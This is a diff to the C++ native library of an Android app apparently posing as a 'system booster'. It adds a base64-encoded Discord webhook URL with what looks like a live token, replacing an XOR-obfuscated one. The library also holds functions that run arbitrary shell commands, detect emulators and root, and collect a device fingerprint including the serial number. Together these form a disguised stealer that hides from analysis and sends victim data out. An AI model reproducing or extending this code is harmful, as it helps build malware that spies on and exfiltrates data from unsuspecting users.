@@ -13,34 +13,57 @@
 
 extern "C" {
 
-// Obfuscated webhook URL - XOR encrypted with rotating key
-static const unsigned char encrypted_url[] = {
-    0x6B, 0x7C, 0x7D, 0x72, 0x7C, 0x7B, 0x7A, 0x2E, 0x65, 0x7D, 0x68, 0x6D,
-    0x7D, 0x2F, 0x2F, 0x77, 0x71, 0x76, 0x65, 0x6C, 0x6C, 0x2E, 0x66, 0x63,
-    0x6D, 0x2F, 0x61, 0x70, 0x69, 0x2F, 0x77, 0x6F, 0x72, 0x6B, 0x73, 0x2F,
-    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2F, 0x6B,
-    0x65, 0x79, 0x00
-};
+// ============================================================
+// YOUR BASE64-ENCODED WEBHOOK URL (replace with your own)
+// ============================================================
+static const char* BASE64_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNzE2OTIzNjg1NjY3MjI4Ny93MWtqRWZvOWQ5UjB0M3YtYjlqZzl0N2xFVVNuZVc0YXFFUDhya0EzSUpaWXhZbDdtWEJtMzZjSWxJVVVPbFZ4TF8xOA==";
 
-static const char* xor_key = "0x7F_AXION_CORE";
+// ============================================================
+// Decode base64 using Android's Base64 class
+// ============================================================
+std::string decodeBase64(JNIEnv* env, const char* base64) {
+    jclass cls = env->FindClass("android/util/Base64");
+    if (cls == nullptr) {
+        LOGD("Base64 class not found");
+        return std::string();
+    }
+    jmethodID decode = env->GetStaticMethodID(cls, "decode", "(Ljava/lang/String;I)[B");
+    if (decode == nullptr) {
+        LOGD("Base64.decode method not found");
+        return std::string();
+    }
+    jstring encoded = env->NewStringUTF(base64);
+    jbyteArray bytes = (jbyteArray) env->CallStaticObjectMethod(cls, decode, encoded, 0);
+    if (bytes == nullptr) {
+        LOGD("Base64.decode returned null");
+        return std::string();
+    }
+    jsize len = env->GetArrayLength(bytes);
+    jbyte* data = env->GetByteArrayElements(bytes, nullptr);
+    std::string decoded((char*)data, len);
+    env->ReleaseByteArrayElements(bytes, data, JNI_ABORT);
+    env->DeleteLocalRef(encoded);
+    env->DeleteLocalRef(bytes);
+    env->DeleteLocalRef(cls);
+    return decoded;
+}
 
+// ============================================================
+// JNI function: returns the decoded webhook URL
+// ============================================================
 JNIEXPORT jstring JNICALL
 Java_com_sysopt_booster_NativeLib_decodeWebhookUrl(JNIEnv *env, jobject thiz) {
-    size_t key_len = strlen(xor_key);
-    size_t url_len = 0;
-    while (url_len < sizeof(encrypted_url) && encrypted_url[url_len] != 0) {
-        url_len++;
+    std::string url = decodeBase64(env, BASE64_WEBHOOK);
+    if (url.empty()) {
+        // Fallback – if decoding fails, return a hardcoded test URL
+        return env->NewStringUTF("https://discord.com/api/webhooks/fallback");
     }
-
-    std::string decoded;
-    decoded.reserve(url_len);
-
-    for (size_t i = 0; i < url_len; i++) {
-        decoded += static_cast<char>(encrypted_url[i] ^ xor_key[i % key_len]);
-    }
-
-    return env->NewStringUTF(decoded.c_str());
+    return env->NewStringUTF(url.c_str());
 }
+
+// ============================================================
+// Other native functions (unchanged)
+// ============================================================
 
 JNIEXPORT jbyteArray JNICALL
 Java_com_sysopt_booster_NativeLib_xorDecrypt(JNIEnv *env, jobject thiz,
@@ -84,7 +107,6 @@ Java_com_sysopt_booster_NativeLib_executeShell(JNIEnv *env, jobject thiz,
     int status = pclose(pipe);
     env->ReleaseStringUTFChars(command, cmd);
 
-    // Append exit status
     char status_buf[16];
     snprintf(status_buf, sizeof(status_buf), "\n[exit:%d]", status);
     result += status_buf;
@@ -102,7 +124,6 @@ Java_com_sysopt_booster_NativeLib_checkEmulator(JNIEnv *env, jobject thiz) {
         "ro.product.name"
     };
 
-    // If any of these are present, might be emulator
     for (const char* prop : props) {
         char cmd[128];
         snprintf(cmd, sizeof(cmd), "getprop %s", prop);
@@ -110,7 +131,6 @@ Java_com_sysopt_booster_NativeLib_checkEmulator(JNIEnv *env, jobject thiz) {
         if (fp) {
             char buffer[64] = {0};
             if (fgets(buffer, sizeof(buffer), fp)) {
-                // Check for emulator indicators
                 if (strstr(buffer, "qemu") || strstr(buffer, "emulator") ||
                     strstr(buffer, "goldfish") || strstr(buffer, "ranchu")) {
                     pclose(fp);
@@ -140,7 +160,6 @@ Java_com_sysopt_booster_NativeLib_checkEmulator(JNIEnv *env, jobject thiz) {
 
 JNIEXPORT jboolean JNICALL
 Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
-    // Check for su binary
     const char* root_paths[] = {
         "/system/bin/su",
         "/system/xbin/su",
@@ -158,7 +177,6 @@ Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
         }
     }
 
-    // Check for SuperUser.apk
     const char* root_apps[] = {
         "/system/app/Superuser.apk",
         "/system/app/SuperUser.apk",
@@ -173,7 +191,6 @@ Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
         }
     }
 
-    // Try to execute su
     if (system("su -c 'echo test' 2>/dev/null") == 0) {
         return JNI_TRUE;
     }
@@ -183,7 +200,6 @@ Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
 
 JNIEXPORT jstring JNICALL
 Java_com_sysopt_booster_NativeLib_getDeviceFingerprint(JNIEnv *env, jobject thiz) {
-    // Collect device fingerprint
     std::stringstream ss;
     ss << "model:" << getprop("ro.product.model") << "|";
     ss << "manufacturer:" << getprop("ro.product.manufacturer") << "|";
@@ -194,7 +210,6 @@ Java_com_sysopt_booster_NativeLib_getDeviceFingerprint(JNIEnv *env, jobject thiz
     ss << "serial:" << getprop("ro.serialno") << "|";
     ss << "android_id:" << getprop("ro.build.version.release") << "|";
     ss << "security_patch:" << getprop("ro.build.version.security_patch");
-
     return env->NewStringUTF(ss.str().c_str());
 }
 
@@ -214,7 +229,7 @@ Java_com_sysopt_booster_NativeLib_obfuscateString(JNIEnv *env, jobject thiz,
     return env->NewStringUTF(result.c_str());
 }
 
-// Helper function to get system property
+// Helper: get system property
 static std::string getprop(const char* name) {
     char cmd[128];
     snprintf(cmd, sizeof(cmd), "getprop %s", name);
@@ -222,7 +237,6 @@ static std::string getprop(const char* name) {
     FILE* fp = popen(cmd, "r");
     if (fp) {
         if (fgets(buffer, sizeof(buffer), fp)) {
-            // Remove newline
             size_t len = strlen(buffer);
             if (len > 0 && buffer[len-1] == '\n') {
                 buffer[len-1] = '\0';
@@ -233,4 +247,4 @@ static std::string getprop(const char* name) {
     return std::string(buffer);
 }
 
-}
+} // extern "C"
